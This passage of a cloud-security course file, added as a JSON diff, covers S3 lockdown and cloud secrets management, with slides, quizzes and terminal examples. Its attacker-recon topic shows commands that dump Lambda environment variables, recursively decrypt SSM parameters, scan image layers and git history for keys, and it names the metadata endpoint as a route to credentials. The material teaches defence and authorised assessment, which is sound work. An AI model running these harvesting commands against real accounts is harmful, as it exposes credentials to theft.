+                  "output": "AccessDenied (aws:sourceVpce)   (VPC-endpoint policy closes exit 5 from the internet)"
+                },
+                {
+                  "command": "aws ec2 describe-snapshot-attribute --snapshot-id snap-0a1b --attribute createVolumePermission --query 'CreateVolumePermissions'",
+                  "output": "[]   (no 'all'/shared entries: exit 3 closed)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It: Lock the Bucket (Lab)",
+            "body": "The 'Lock the Bucket' lab is the module finale. You design a bucket that is private BY CONSTRUCTION and then prove each exit is sealed:\n\n1. Enable account + bucket Block Public Access; disable ACLs.\n2. Encrypt with a customer-managed KMS key; add deny-unencrypted-PutObject.\n3. Create a VPC gateway endpoint and a bucket policy denying any request not arriving via aws:sourceVpce.\n4. Ensure no public snapshots/exports and no replication leaving the boundary.\n5. Enable CloudTrail data events + GuardDuty S3 protection.\n6. TEST every path: anonymous read, stolen-key read from the internet, a pre-signed URL from outside the VPC, a snapshot restore from another account - each must fail. Capture the AccessDenied for each as your evidence.\n\nA control you have not tested is a control you do not have."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Attackers do not care which door is open - they only need one. Your job as defender is the harder, complete task: close every door AND verify it. This 'enumerate-every-path-then-test' method is exactly how a real cloud security review and a bug-bounty assessment both work.\n\nThe habit generalises far beyond S3: for any sensitive asset, list every way data can leave, bolt each with a specific control, add detection in case prevention fails, and prove closure by attacking your own design. Map these controls to the CIS AWS Benchmark and AWS Foundational Security Best Practices, and you have a defensible, auditable storage posture - and the exact skillset to find the gaps in someone else's."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m6",
+    "name": "Secrets Management in the Cloud",
+    "shortName": "Secrets Management",
+    "month": 2,
+    "weeks": [
+      2
+    ],
+    "description": "Secrets — API keys, DB passwords, tokens — are the fuel of lateral movement. This module covers where cloud secrets live, how they leak, how managed secret stores work, and how workloads should obtain credentials without ever embedding a long-lived key.",
+    "estimatedHours": 9,
+    "outcomes": [
+      "Enumerate secret stores (Secrets Manager, SSM Parameter Store, KMS, env vars) and their access controls",
+      "Identify secret-leakage vectors across code, images, logs, Lambda env vars and CI/CD",
+      "Design keyless workload identity (IAM roles, IRSA, workload identity federation)",
+      "Implement secret rotation and detect secret access abuse"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m6-1",
+        "moduleId": "cloud-m6",
+        "number": 34,
+        "title": "Where Cloud Secrets Live",
+        "type": "theory",
+        "week": 2,
+        "description": "Maps every place a credential hides in a cloud account and the access control on each, so students can both find and protect them.",
+        "keyPoints": [
+          "AWS Secrets Manager (rotation, resource policy) vs SSM Parameter Store (SecureString)",
+          "Lambda / ECS / CodeBuild environment variables (visible to anyone with describe)",
+          "User data / instance metadata and cloud-init scripts",
+          "Terraform state files and CI/CD variable stores",
+          "Hardcoded secrets in container image layers and git history"
+        ],
+        "slides": [
+          {
+            "title": "What 'Where Secrets Live' Means",
+            "body": "A secret is any value that proves identity or unlocks access: an API key, a database password, an OAuth token, a TLS private key. In the cloud these are the fuel for lateral movement — steal one and you often get to act as a whole service.\n\nThink of a cloud account like a large office building. Secrets are the keys. The problem is nobody keeps them all in one labelled key cabinet. Some are in the cabinet (a secrets manager), but others are taped under desks (env vars), left on sticky notes (git history), or photocopied into old filing boxes (container image layers). An attacker doesn't need the cabinet if a copy is taped under a desk.\n\nThis topic maps *every* place a credential hides and the access control on each, so you can both find them (as an attacker) and lock them down (as a defender)."
+          },
+          {
+            "title": "The Secret-Sprawl Map",
+            "body": "Secrets scatter across storage, compute, pipeline and history. The managed stores on the left are the *intended* home, with real access control. Everything else is accidental sprawl — usually with weaker or no gating.\n\nThe security lesson: the strength of your secret management is the *weakest* copy, not the strongest. A perfectly-policed Secrets Manager entry means nothing if the same password sits in plaintext in a CloudFormation parameter or a two-year-old git commit.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "sec",
+                  "label": "A DB password",
+                  "highlighted": true
+                },
+                {
+                  "id": "sm",
+                  "label": "Secrets Manager (gated)"
+                },
+                {
+                  "id": "ssm",
+                  "label": "SSM Parameter Store"
+                },
+                {
+                  "id": "env",
+                  "label": "Lambda/ECS env var"
+                },
+                {
+                  "id": "ud",
+                  "label": "EC2 user-data script"
+                },
+                {
+                  "id": "tf",
+                  "label": "Terraform state file"
+                },
+                {
+                  "id": "git",
+                  "label": "git history"
+                },
+                {
+                  "id": "img",
+                  "label": "container image layer"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "sec",
+                  "to": "sm",
+                  "label": "intended"
+                },
+                {
+                  "from": "sec",
+                  "to": "ssm",
+                  "label": "intended"
+                },
+                {
+                  "from": "sec",
+                  "to": "env",
+                  "label": "copied for runtime"
+                },
+                {
+                  "from": "sec",
+                  "to": "ud",
+                  "label": "bootstrap"
+                },
+                {
+                  "from": "sec",
+                  "to": "tf",
+                  "label": "leaks into state"
+                },
+                {
+                  "from": "sec",
+                  "to": "git",
+                  "label": "committed by mistake"
+                },
+                {
+                  "from": "sec",
+                  "to": "img",
+                  "label": "baked at build"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Secrets Manager vs SSM Parameter Store",
+            "body": "AWS has two first-party stores and they are not interchangeable. Secrets Manager is purpose-built for secrets: it has native rotation, resource policies, and it always uses KMS encryption. SSM Parameter Store is a general config store that *can* hold secrets as a SecureString (KMS-encrypted) but has no built-in rotation and bills differently.\n\nBoth gate access with IAM, and both back encryption with KMS — which means reading a SecureString or a secret needs *two* permissions, the store's read action and kms:Decrypt. Knowing which store a target uses tells you which IAM actions to look for.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Secrets Manager",
+                  "points": [
+                    "Built for secrets",
+                    "Native rotation (Lambda)",
+                    "Resource policy per secret",
+                    "Always KMS-encrypted",
+                    "Costs ~$0.40/secret/mo",
+                    "Read: secretsmanager:GetSecretValue"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "SSM Parameter Store",
+                  "points": [
+                    "General config + secrets",
+                    "No native rotation",
+                    "Access by path hierarchy + IAM",
+                    "SecureString = KMS-encrypted",
+                    "Standard tier free",
+                    "Read: ssm:GetParameter (+WithDecryption)"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Environment Variables: the Favourite Hiding Place",
+            "body": "Developers love env vars because the app just reads process.env. But on Lambda, ECS and CodeBuild the env vars are stored in the service's *configuration*, and anyone with the describe permission can read them in plaintext — no decrypt, no secret store, nothing.\n\nThis is the single most common real-world cloud secret leak: a `DB_PASSWORD` sitting in a Lambda's environment, readable by any principal with `lambda:GetFunctionConfiguration`.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws lambda get-function-configuration --function-name billing-api --query Environment.Variables",
+                  "output": "{\n  \"DB_HOST\": \"prod-db.ci1a.rds.amazonaws.com\",\n  \"DB_USER\": \"admin\",\n  \"DB_PASSWORD\": \"S3cr3t-Pr0d-2024!\",\n  \"STRIPE_KEY\": \"sk_live_51Hxx...\"\n}"
+                }
+              ]
+            },
+            "check": {
+              "question": "A Lambda function stores DB_PASSWORD as a plaintext environment variable. Which single IAM permission lets an attacker read it?",
+              "options": [
+                "kms:Decrypt only",
+                "lambda:GetFunctionConfiguration",
+                "secretsmanager:GetSecretValue",
+                "No permission — env vars are always encrypted at rest and unreadable"
+              ],
+              "correctIndex": 1,
+              "explanation": "Lambda env vars live in the function's configuration. lambda:GetFunctionConfiguration (or describe via the console) returns them in plaintext. Encryption at rest protects the disk, not the API response — the describe call hands you the cleartext value, no KMS decrypt needed."
+            }
+          },
+          {
+            "title": "User Data, Metadata and Bootstrap Scripts",
+            "body": "EC2 instances run a *user-data* script at first boot to configure themselves. Teams often paste credentials straight into it — a registry password, a config-download token. That script is retrievable for the life of the instance from the metadata service at `http://169.254.169.254/latest/user-data`, readable by anything running on the box.\n\ncloud-init and Launch Template user-data have the same exposure. If an attacker lands any code execution (or an SSRF, covered in module cloud-m7), the user-data is one request away. Treat user-data as world-readable to anyone on the instance."
+          },
+          {
+            "title": "Terraform State and CI/CD Variable Stores",
+            "body": "Infrastructure-as-code quietly collects secrets. When Terraform creates an RDS database, the password you passed becomes a plaintext attribute in the *state file* — even if you later move the real secret into Secrets Manager. A state file in an unencrypted, public, or world-readable S3 bucket is a jackpot.\n\nCI/CD systems (GitHub Actions secrets, GitLab CI variables, Jenkins credentials) are a second vault class. They are designed to hide values at display time, but a malicious pull request, an injected build step, or an over-broad `echo $SECRET` can print them to a log that anyone with read access can view.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "terraform apply",
+                  "detail": "you pass db_password"
+                },
+                {
+                  "label": "resource created",
+                  "detail": "RDS gets the password"
+                },
+                {
+                  "label": "state written",
+                  "detail": "password stored plaintext in tfstate"
+                },
+                {
+                  "label": "state in S3",
+                  "detail": "if bucket is public/unencrypted = leak"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Git History and Container Image Layers",
+            "body": "Two 'frozen in time' sources attackers love:\n\nGit history — deleting a secret from the current file does NOT remove it. `git log -p` or a scanner recovers it from the commit where it was added. Rotating the credential is the only real fix; scrubbing history is hard and often incomplete.\n\nContainer images — a Dockerfile `ARG`/`ENV`/`COPY` that pulls a secret during build bakes it into a *layer*. Even if the final layer deletes the file, the earlier layer still contains it. `docker history` and layer extraction recover it. This is why multi-stage builds and build-time secret mounts (`--mount=type=secret`) exist."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Secrets are the pivot point of almost every cloud breach. One leaked long-lived key turns an outsider into an insider with the exact permissions of whatever the key belongs to.\n\nThe defender's takeaway from this map: (1) centralise secrets in a managed store with rotation, (2) stop copying them into env vars, user-data, state and images, and (3) assume anything in history or an image layer is already compromised and must be rotated.\n\nIn the 'Secret Hunt' lab you will extract planted secrets from a git repo, a container image and a Lambda config — proving how shallow the access control on these sprawl locations really is. The rest of the module then shows the managed stores and keyless patterns that shrink the map down to almost nothing."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m6-2",
+        "moduleId": "cloud-m6",
+        "number": 35,
+        "title": "Secret-Leakage Vectors",
+        "type": "lab",
+        "week": 2,
+        "description": "Finding secrets as an attacker across the estate. Students scan code, images and runtime config for exposed credentials.",
+        "keyPoints": [
+          "git history scanning: trufflehog, gitleaks, detect-secrets",
+          "Container image scanning for baked-in secrets (every layer, not just the final)",
+          "Reading Lambda/ECS env vars via describe-function-configuration",
+          "CloudTrail/CloudWatch logs leaking secrets in plaintext",
+          "SSRF-to-metadata and SSM Parameter Store reads as credential sources"
+        ],
+        "slides": [
+          {
+            "title": "Finding Secrets Like an Attacker",
+            "body": "This is the offensive half of the module. Having mapped where secrets live, you now go and *find* them across code, images and runtime config — the way a real attacker or bug-bounty hunter does during recon.\n\nAnalogy: you have the blueprint of the building showing every place keys might be hidden. Now you walk the floor with a metal detector. Scanners are that detector — they sweep huge volumes of text and config for things that *look like* credentials (high-entropy strings, known key prefixes like `AKIA` or `sk_live_`).\n\nThe goal is coverage: one found key can be the whole engagement. This topic is the backbone of the 'Secret Hunt' lab."
+          },
+          {
+            "title": "The Leakage-Hunting Workflow",
+            "body": "A disciplined hunt sweeps four surfaces in order of effort: source history is cheapest, runtime config needs credentials you may not have yet, and logs are often the overlooked goldmine. Each found secret can unlock the next surface — a leaked key from git might grant the AWS access needed to read Lambda env vars.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "1. Source + git history",
+                  "detail": "trufflehog / gitleaks"
+                },
+                {
+                  "label": "2. Container images",
+                  "detail": "scan every layer"
+                },
+                {
+                  "label": "3. Runtime config",
+                  "detail": "Lambda/ECS env vars, SSM"
+                },
+                {
+                  "label": "4. Logs + metadata",
+                  "detail": "CloudTrail/CloudWatch, 169.254.169.254"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Git History Scanning: the Core Tools",
+            "body": "Three standard tools, each with a niche. trufflehog excels at *verified* secrets — it can test a found AWS key against the API to confirm it's live, cutting false positives. gitleaks is fast and regex/entropy-driven, great in CI. detect-secrets (Yelp) is built for a pre-commit baseline so new secrets are blocked going forward.\n\nAll of them walk the full commit graph, not just HEAD, so a secret deleted long ago still surfaces.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "trufflehog git file://./billing-service --only-verified",
+                  "output": "Found verified result 🔑🔑\nDetector Type: AWS\nDecoder Type: PLAIN\nRaw result: AKIAIOSFODNN7EXAMPLE\nCommit: 9f3c1a2  (3 years ago)\nFile: config/deploy.rb  Line: 14\nAccount: 123456789012"
+                }
+              ]
+            },
+            "check": {
+              "question": "Why does trufflehog's --only-verified flag matter during a secret hunt?",
+              "options": [
+                "It scans faster by skipping entropy checks",
+                "It actively tests each candidate against the provider's API and reports only live, working credentials, cutting false positives",
+                "It only scans the current HEAD commit, not history",
+                "It encrypts the secrets it finds"
+              ],
+              "correctIndex": 1,
+              "explanation": "Verification means trufflehog calls the provider (e.g. AWS STS) to check the credential is valid. Verified hits are real, live secrets — the ones worth reporting — so you waste no time triaging dead or example keys. Unverified scanning still finds candidates but with more noise."
+            }
+          },
+          {
+            "title": "Scanning Container Images (Every Layer)",
+            "body": "A key lesson from topic 1: a secret deleted in the final layer still lives in an earlier one. So you must scan the *whole* image, not the running filesystem.\n\nThe practical move is to pull the image, inspect its build history for suspicious ADD/COPY/ENV, and run a layer-aware scanner. trufflehog can scan a docker image directly; tools like `dive` let you browse per-layer contents.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "docker history --no-trunc myorg/api:latest | grep -i -E 'token|key|password'",
+                  "output": "RUN /bin/sh -c echo \"NPM_TOKEN=npm_9fA2...\" > ~/.npmrc   # leaked in layer 4"
+                },
+                {
+                  "command": "trufflehog docker --image myorg/api:latest --only-verified",
+                  "output": "Found verified result 🔑  Detector: NPM  Layer: sha256:4b1c...  (removed in final layer but still present)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Reading Runtime Config: Env Vars and SSM",
+            "body": "If you already hold some AWS access (from a leaked key, or inside the 'Secret Hunt' lab), runtime config is the next harvest. Enumerate Lambda functions and ECS task definitions and dump their environment; sweep SSM Parameter Store for SecureStrings you can decrypt.\n\nThis is pure describe/read activity — low-noise and often permitted by over-broad read-only roles.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "for f in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do aws lambda get-function-configuration --function-name $f --query 'Environment.Variables'; done",
+                  "output": "{\"SLACK_WEBHOOK\": \"https://hooks.slack.com/services/T00/B00/xoxb...\"}\n{\"JWT_SIGNING_SECRET\": \"hs256-prod-4c9e2...\"}"
+                },
+                {
+                  "command": "aws ssm get-parameters-by-path --path /prod/ --recursive --with-decryption --query 'Parameters[].[Name,Value]'",
+                  "output": "[[\"/prod/db/password\", \"P@ssw0rd-rds-01\"], [\"/prod/api/stripe\", \"sk_live_51Hxx...\"]]"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Logs and the SSRF-to-Metadata Source",
+            "body": "Two underrated credential sources:\n\nLogs — applications log request bodies, headers and errors. CloudTrail and CloudWatch regularly capture tokens, Authorization headers, or a secret passed as a CLI argument. Searching logs for `password=`, `token`, `Authorization` often pays off, and log read access is widely granted.\n\nSSM + metadata — if you achieve SSRF against a workload (the whole of module cloud-m7), the instance metadata service at 169.254.169.254 hands you the workload's role credentials, and from there SSM Parameter Store and Secrets Manager reads become possible. Secrets hunting and SSRF chain together: one feeds the other."
+          },
+          {
+            "title": "Triage and Impact",
+            "body": "A raw scanner hit is not a finding. Triage: is it live (verify), what does it unlock (scope), and is it in scope for your engagement? A dead test key is a non-finding; a verified `sk_live_` Stripe key or an IAM user access key with admin is critical.\n\nFor a report, capture: the exact location (repo+commit, image layer, Lambda name), the credential type (redact the value), proof it is live, and the blast radius if abused.\n\nDefensively, the same scan run in CI (gitleaks pre-commit, GitHub push protection) stops the leak before it ships. The hunt tools are dual-use: run them against yourself first."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Most 'advanced' cloud breaches start with an embarrassingly simple leaked key. Secret-scanning is the highest return-on-effort recon you can do, offensively and defensively.\n\nThe defender's version of this topic: wire gitleaks or trufflehog into pre-commit and CI, enable provider push-protection (GitHub secret scanning blocks pushes that contain known key formats), scan images in the registry pipeline, and keep secrets out of env vars and logs in the first place.\n\nIn the 'Secret Hunt' lab you run exactly this workflow: trufflehog across a repo, a layer scan of a container image, and env-var enumeration of a Lambda — three surfaces, three planted secrets."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m6-3",
+        "moduleId": "cloud-m6",
+        "number": 36,
+        "title": "Managed Secret Stores",
+        "type": "theory",
+        "week": 2,
+        "description": "How Secrets Manager and Parameter Store actually gate access, and how their resource policies create cross-account exposure if sloppy.",
+        "keyPoints": [
+          "Secrets Manager resource policies and KMS-key-backed encryption",
+          "Access requires both secretsmanager:GetSecretValue and kms:Decrypt",
+          "Parameter Store SecureString backed by KMS; hierarchy-based access",
+          "Versioning, staging labels (AWSCURRENT/AWSPENDING) and rotation",
+          "Auditing secret reads via CloudTrail"
+        ],
+        "slides": [
+          {
+            "title": "What Managed Secret Stores Do",
+            "body": "A managed secret store is a dedicated service whose entire job is to hold secrets, gate who can read them, encrypt them, and log every access. On AWS the two are Secrets Manager and SSM Parameter Store (SecureString).\n\nAnalogy: instead of keys taped under desks, you install a smart key cabinet. Every drawer is locked, opening one requires a badge AND a second PIN (IAM + KMS), and the cabinet writes a tamper-proof log of exactly who opened which drawer and when.\n\nThe value isn't the encryption alone — it's the *centralised, audited, policy-controlled* access. But that control is only as good as the policies you write, and sloppy resource policies create cross-account exposure."
+          },
+          {
+            "title": "The Two-Lock Access Model",
+            "body": "Reading a secret is a two-lock operation. First IAM must allow the store action (`secretsmanager:GetSecretValue` or `ssm:GetParameter`). Second, because the ciphertext is wrapped by a KMS key, the caller must also be allowed `kms:Decrypt` on that key. Miss either and the read fails.\n\nThis is why you sometimes see 'AccessDenied' even with the secret permission granted — the KMS key policy didn't allow the principal. For an attacker it means a stolen role needs BOTH permissions; for a defender it's a deliberate layered control.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "App calls GetSecretValue",
+                  "detail": "presents IAM identity"
+                },
+                {
+                  "label": "Lock 1: IAM",
+                  "detail": "secretsmanager:GetSecretValue allowed?"
+                },
+                {
+                  "label": "Lock 2: KMS",
+                  "detail": "kms:Decrypt on backing key allowed?"
+                },
+                {
+                  "label": "Plaintext returned",
+                  "detail": "only if BOTH pass; call logged to CloudTrail"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Resource Policies and Cross-Account Exposure",
+            "body": "Secrets Manager secrets can carry a *resource policy* — a policy attached to the secret itself, like an S3 bucket policy. This is powerful and dangerous: a resource policy can grant another AWS account read access to the secret.\n\nA common misconfiguration is a resource policy with an over-broad Principal (e.g. `\"AWS\": \"*\"` or a wildcard account) combined with a KMS key that also permits cross-account decrypt. That combination silently exposes production secrets to the whole world or to an attacker-controlled account. Auditing resource policies for broad principals is a core review step.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Dangerous resource policy",
+                  "points": [
+                    "Principal: \"AWS\": \"*\"",
+                    "or an unknown external account",
+                    "KMS key also allows cross-account Decrypt",
+                    "Result: secret readable outside your org"
+                  ]
+                },
+                {
+                  "label": "Safe resource policy",
+                  "points": [
+                    "Principal: specific role ARNs only",
+                    "Condition on aws:PrincipalOrgID",
+                    "KMS key scoped to same accounts",
+                    "Result: least-privilege, in-org access"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Reading a Secret",
+            "body": "Here is the full interaction. The caller retrieves a secret by name; Secrets Manager returns the current version as a JSON string. Behind the scenes it decrypted the ciphertext with KMS on the caller's behalf — which is why the IAM role needed kms:Decrypt too.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "App (IAM role)",
+              "rightLabel": "Secrets Manager",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "GetSecretValue",
+                  "payload": "SecretId: prod/billing/db\nVersionStage: AWSCURRENT"
+                },
+                {
+                  "direction": "left",
+                  "label": "200 OK",
+                  "payload": "{\n  \"ARN\": \"...:secret:prod/billing/db-AbCdE\",\n  \"VersionId\": \"a1b2...\",\n  \"SecretString\": \"{\\\"user\\\":\\\"admin\\\",\\\"password\\\":\\\"R0tat3d-2026\\\"}\",\n  \"VersionStages\": [\"AWSCURRENT\"]\n}"
+                }
+              ]
+            },
+            "check": {
+              "question": "An IAM role has secretsmanager:GetSecretValue but its GetSecretValue call still returns AccessDenied. What is the most likely cause?",
+              "options": [
+                "The secret does not exist",
+                "The role lacks kms:Decrypt on the KMS key that encrypts the secret",
+                "Secrets Manager is down",
+                "The secret has no resource policy"
+              ],
+              "correctIndex": 1,
+              "explanation": "Secrets are KMS-encrypted, so a successful read needs BOTH secretsmanager:GetSecretValue AND kms:Decrypt on the backing key. Having only the Secrets Manager action but not the KMS permission produces AccessDenied — the classic two-lock failure."
+            }
+          },
+          {
+            "title": "Versioning, Staging Labels and Rotation Hooks",
+            "body": "Secrets Manager versions every secret and tracks them with *staging labels*. `AWSCURRENT` points at the live version your apps read; `AWSPENDING` is a new candidate version during rotation; `AWSPREVIOUS` is the one just replaced.\n\nThis label system is what makes zero-downtime rotation possible: the rotation Lambda creates an AWSPENDING version, tests it, then atomically moves the AWSCURRENT label to it. Apps always ask for AWSCURRENT and never notice the swap. Understanding these labels is essential for topic 6 (Rotation & Detection)."
+          },
+          {
+            "title": "Parameter Store Specifics",
+            "body": "SSM Parameter Store organises values in a *path hierarchy* like `/prod/billing/db-password`. Access is granted per-path, so a role can be scoped to `/prod/billing/*` and nothing else — a clean least-privilege model.\n\nSecureString parameters are KMS-encrypted and need `--with-decryption` plus kms:Decrypt to read in cleartext. Parameter Store has no native rotation, so teams either use the Advanced tier with custom automation or prefer Secrets Manager when rotation matters. The standard tier is free, which is why config-heavy shops lean on it."
+          },
+          {
+            "title": "Auditing Secret Reads with CloudTrail",
+            "body": "Every GetSecretValue, GetParameter and the underlying KMS Decrypt is logged to CloudTrail with the caller identity, time and source IP. This is the raw material for detection (topic 6): a single app reading its own secret is normal; one principal reading fifty different secrets in a minute is exfiltration.\n\nFor defenders, CloudTrail on secret stores turns an opaque vault into an auditable one. For attackers, it's the reason mass secret reads are loud — and why a careful adversary reads only the one secret they need."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Managed stores are the *destination* you want all the sprawl from topics 1-2 to collapse into: one audited, policy-gated, rotated home per secret.\n\nBut they are not magic. The access control is the policy, not the ciphertext — a world-readable resource policy or an over-broad KMS key undoes everything. The review checklist is: scope IAM and KMS tightly, keep resource-policy principals specific (ideally constrained to aws:PrincipalOrgID), enable rotation, and watch CloudTrail.\n\nGet this right and a leaked long-lived key becomes far less likely — which sets up topic 4, where the goal becomes having no long-lived key at all."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m6-4",
+        "moduleId": "cloud-m6",
+        "number": 37,
+        "title": "Keyless Workload Identity",
+        "type": "theory",
+        "week": 2,
+        "description": "The goal: no long-lived keys anywhere. Covers how workloads authenticate using roles and federation instead of embedded credentials.",
+        "keyPoints": [
+          "EC2 instance profiles and ECS task roles — credentials delivered via metadata",
+          "IRSA (IAM Roles for Service Accounts) for EKS pods via OIDC",
+          "Workload identity federation: GitHub Actions OIDC -> AWS role, no stored key",
+          "GCP Workload Identity and Azure Managed Identities equivalents",
+          "Why federation kills the leaked-static-key problem at the root"
+        ],
+        "slides": [
+          {
+            "title": "The Goal: No Long-Lived Keys Anywhere",
+            "body": "Every topic so far hunted or protected static secrets. Keyless workload identity asks a bolder question: what if the credential never exists as a stored value at all?\n\nAnalogy: a static access key is a house key you carry — lose it and anyone can use it forever. Workload identity is a hotel keycard the front desk re-issues each morning, scoped to your room, expiring at checkout. There is nothing durable to steal; by the time an attacker finds a copy, it has expired.\n\nThe mechanism: instead of embedding `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`, the workload *proves who it is* to the cloud and receives short-lived credentials on demand. This removes the single biggest cause of cloud breaches — the leaked long-lived key."
+          },
+          {
+            "title": "Static Keys vs Workload Identity",
+            "body": "The difference is lifetime and storage. A static key is long-lived and must be stored somewhere (and therefore can leak and be reused indefinitely). Workload identity issues temporary credentials tied to the running workload, delivered just-in-time and expiring in minutes to hours.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Static access key",
+                  "points": [
+                    "Long-lived (until rotated)",
+                    "Must be stored (env, file, CI secret)",
+                    "Leaks = reusable forever",
+                    "Hard to attribute to a workload",
+                    "You own rotation"
+                  ]
+                },
+                {
+                  "label": "Workload identity",
+                  "points": [
+                    "Short-lived (minutes-hours)",
+                    "Never stored; fetched on demand",
+                    "Leak expires quickly",
+                    "Scoped to a specific role/workload",
+                    "Auto-refreshed by the platform"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Metadata-Delivered Credentials",
+            "body": "For EC2 and ECS, AWS delivers role credentials through the *metadata service*. You attach an instance profile (EC2) or task role (ECS) to the workload. The SDK, when it needs to call AWS, fetches temporary credentials from the local metadata endpoint — no key in the code.\n\nThe credentials are the STS temporary set (access key id, secret, AND a session token) and auto-rotate before expiry. The tradeoff, previewed here and covered in module cloud-m7: because the metadata endpoint hands out these credentials, an SSRF that reaches it steals them — which is why IMDSv2 exists.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Attach role",
+                  "detail": "instance profile / ECS task role"
+                },
+                {
+                  "label": "SDK needs to call AWS",
+                  "detail": "no key present in code"
+                },
+                {
+                  "label": "SDK queries metadata",
+                  "detail": "169.254.169.254 (EC2) / task endpoint (ECS)"
+                },
+                {
+                  "label": "Gets temp STS creds",
+                  "detail": "key+secret+session token, auto-expiring"
+                }
+              ]
+            }
+          },
+          {
+            "title": "IRSA: Keyless Identity for Kubernetes Pods",
+            "body": "EKS pods use IRSA — IAM Roles for Service Accounts. The cluster runs an OIDC identity provider. A pod's Kubernetes service account is annotated with an IAM role ARN. The pod receives a short-lived, signed OIDC token (a JWT) mounted as a file; the AWS SDK exchanges that token with STS (`AssumeRoleWithWebIdentity`) for temporary AWS credentials scoped to that role.\n\nSo each pod gets exactly the AWS permissions its service account maps to — no node-wide shared key, no secret baked into the image. The trust is anchored in the cluster's OIDC provider being registered in IAM.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Service account",
+                  "detail": "annotated with role ARN"
+                },
+                {
+                  "label": "Pod gets OIDC JWT",
+                  "detail": "signed by cluster, mounted as file"
+                },
+                {
+                  "label": "AssumeRoleWithWebIdentity",
+                  "detail": "SDK sends JWT to AWS STS"
+                },
+                {
+                  "label": "STS validates + returns creds",
+                  "detail": "temp creds scoped to the role"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Workload Identity Federation: GitHub Actions to AWS",
+            "body": "The cleanest win is CI/CD. Traditionally pipelines stored a long-lived AWS access key as a CI secret — a top leak source. Federation removes it entirely.\n\nGitHub Actions can issue a signed OIDC token describing the workflow (repo, branch, environment). You register GitHub's OIDC provider in AWS IAM and create a role whose trust policy accepts that token *only* from your repo and branch. The job calls AssumeRoleWithWebIdentity with the token and gets short-lived AWS credentials. No key is stored anywhere.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "GitHub Actions job",
+              "rightLabel": "AWS STS",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "AssumeRoleWithWebIdentity",
+                  "payload": "RoleArn: arn:aws:iam::123456789012:role/gha-deploy\nWebIdentityToken: <OIDC JWT: sub=repo:acme/app:ref:refs/heads/main>"
+                },
+                {
+                  "direction": "left",
+                  "label": "200 Credentials",
+                  "payload": "AccessKeyId: ASIA...\nSecretAccessKey: ...\nSessionToken: ...\nExpiration: 2026-11-16T12:00:00Z  (1 hour)"
+                }
+              ]
+            },
+            "check": {
+              "question": "In GitHub Actions to AWS OIDC federation, what stops ANY GitHub repo from assuming your deploy role?",
+              "options": [
+                "A long-lived access key stored as a GitHub secret",
+                "The IAM role's trust policy restricts the token's sub claim to a specific repo and branch (e.g. repo:acme/app:ref:refs/heads/main)",
+                "GitHub encrypts the role ARN",
+                "Nothing — any repo can assume it, which is why OIDC is insecure"
+              ],
+              "correctIndex": 1,
+              "explanation": "The role's trust policy uses a Condition on the OIDC token claims (the sub, and the aud). Scoping sub to repo:acme/app:ref:refs/heads/main means only that repo on that branch can assume the role. A missing or wildcard condition is the dangerous misconfiguration — it would let any repo assume the role."
+            }
+          },
+          {
+            "title": "The Other Clouds: GCP and Azure",
+            "body": "The pattern is cross-cloud. GCP has *Workload Identity* (for GKE) and *Workload Identity Federation* (for external/CI workloads) that map an external identity to a service account without a JSON key file — replacing the notoriously leaky downloaded service-account key.\n\nAzure has *Managed Identities*: system- or user-assigned identities attached to a resource (VM, Function, Container App) that obtain Azure AD tokens from a local endpoint, no secret in config. It also supports *workload identity federation* for GitHub/other OIDC. Same idea everywhere: prove identity, get a short-lived token, store nothing."
+          },
+          {
+            "title": "Trust-Policy Pitfalls (How Keyless Still Goes Wrong)",
